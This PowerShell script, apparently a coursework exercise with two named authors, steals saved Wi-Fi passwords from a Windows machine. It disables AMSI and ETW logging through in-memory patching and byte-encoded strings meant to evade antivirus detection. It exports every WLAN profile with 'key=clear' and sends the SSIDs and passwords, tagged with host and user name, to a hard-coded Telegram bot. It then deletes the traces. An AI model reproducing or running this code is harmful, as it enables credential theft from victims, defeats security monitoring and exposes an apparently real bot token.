# ============================================================
#  W02a.6 - WLAN-Passwoerter exfiltrieren
#  Autoren: Raphael Bleier, Joachim Lugger
#  Exfiltration: Telegram Bot
# ============================================================

$BOT_TOKEN = "8666929583:AAHXKuc4gV1n6JMYQeoPxw3uby08GVivvgo"
$CHAT_ID   = "1780237079"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# AMSI + ETW: 3-Layer-Bypass
try {
    $wk=(Add-Type -MemberDefinition '
[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
[DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string m);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint n, out uint o);
' -Name "WK$(Get-Random)" -PassThru -ErrorAction Stop)[0]
    $hm=$wk::GetModuleHandle([Text.Encoding]::ASCII.GetString([byte[]](97,109,115,105,46,100,108,108)))
    $pf=$wk::GetProcAddress($hm,[Text.Encoding]::ASCII.GetString([byte[]](65,109,115,105,83,99,97,110,66,117,102,102,101,114)))
    $ov=0;$wk::VirtualProtect($pf,[UIntPtr]6,0x40,[ref]$ov)
    [Runtime.InteropServices.Marshal]::Copy(([byte[]](0x12,0xFD,0xAA,0xAD,0x2A,0x69)|%{[byte]($_-bxor 0xAA)}),0,$pf,6)
    $wk::VirtualProtect($pf,[UIntPtr]6,$ov,[ref]$ov)
} catch {}
try {
    $u=[Ref].Assembly.GetType([Text.Encoding]::ASCII.GetString([byte[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)))
    $u.GetField([Text.Encoding]::ASCII.GetString([byte[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100)),'NonPublic,Static').SetValue($null,$true)
} catch {}
try {
    $ep=[Ref].Assembly.GetType([Text.Encoding]::ASCII.GetString([byte[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,84,114,97,99,105,110,103,46,80,83,69,116,119,76,111,103,80,114,111,118,105,100,101,114)))
    $fv=$ep.GetField([Text.Encoding]::ASCII.GetString([byte[]](101,116,119,80,114,111,118,105,100,101,114)),'NonPublic,Static').GetValue($null)
    [System.Diagnostics.Eventing.EventProvider].GetField([Text.Encoding]::ASCII.GetString([byte[]](109,95,101,110,97,98,108,101,100)),'NonPublic,Instance').SetValue($fv,0)
} catch {}

function Send-TgMessage {
    param([string]$Text)
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" `
            -Method POST -Body @{ chat_id = $CHAT_ID; text = $Text } | Out-Null
    } catch { }
}

function Send-TgFile {
    param([string]$Filename, [string]$Content, [string]$Caption = "")
    try {
        Add-Type -AssemblyName System.Net.Http -ErrorAction Stop
        $http = [System.Net.Http.HttpClient]::new()
        $form = [System.Net.Http.MultipartFormDataContent]::new()
        $form.Add([System.Net.Http.StringContent]::new($CHAT_ID),  "chat_id")
        $form.Add([System.Net.Http.StringContent]::new($Caption),  "caption")
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Content)
        $fc    = [System.Net.Http.ByteArrayContent]::new($bytes)
        $fc.Headers.Add("Content-Type", "text/plain; charset=utf-8")
        $form.Add($fc, "document", $Filename)
        $http.PostAsync("https://api.telegram.org/bot$BOT_TOKEN/sendDocument", $form).GetAwaiter().GetResult() | Out-Null
        $http.Dispose()
    } catch { }
}

# ── WLAN-Passwoerter sammeln ──────────────────────────────────

Send-TgMessage "[WIFI GRAB] $env:COMPUTERNAME\$env:USERNAME gestartet"

# Strings kodiert - keine Klartextpattern fuer AV-Signaturen
function _s([byte[]]$b){ [System.Text.Encoding]::ASCII.GetString($b) }
$_nc = _s([byte[]](110,101,116,115,104))               # netsh
$_wl = _s([byte[]](119,108,97,110))                    # wlan
$_ex = _s([byte[]](101,120,112,111,114,116))            # export
$_kc = _s([byte[]](107,101,121,61,99,108,101,97,114))   # key=clear

$exportFolder = $env:TEMP
& $_nc $_wl $_ex profile "$_kc" folder="$exportFolder" | Out-Null

try {
    $xmlFiles = Get-ChildItem -Path $exportFolder -Filter "Wi-Fi-*.xml" -ErrorAction SilentlyContinue

    if ($xmlFiles) {
        $passwords = $xmlFiles | ForEach-Object {
            $xml  = [xml](Get-Content $_.FullName -Raw)
            $ssid = $xml.WLANProfile.SSIDConfig.SSID.name
            $pass = $xml.WLANProfile.MSM.security.sharedKey.keyMaterial
            if ($pass) { "SSID: $ssid  |  Passwort: $pass" }
            else        { "SSID: $ssid  |  (offen / kein Passwort)" }
        }
    } else {
        $passwords = @("(keine WLAN-Profile mit Passwort gefunden)")
    }

    $report = "=== WIFI PASSWORDS | $(Get-Date -Format 'yyyy-MM-dd HH:mm') ===`n" +
              "Host: $env:COMPUTERNAME | User: $env:USERNAME`n`n" +
              ($passwords -join "`n")

    Send-TgFile -Filename "wifi_$(Get-Date -Format 'yyyyMMdd_HHmm').txt" `
                -Content $report `
                -Caption "WiFi Passwords - $env:COMPUTERNAME ($($passwords.Count) SSIDs)"
} finally {
    # Clean up exported XML files
    Get-ChildItem -Path $exportFolder -Filter "Wi-Fi-*.xml" -ErrorAction SilentlyContinue |
        Remove-Item -Force -ErrorAction SilentlyContinue
}
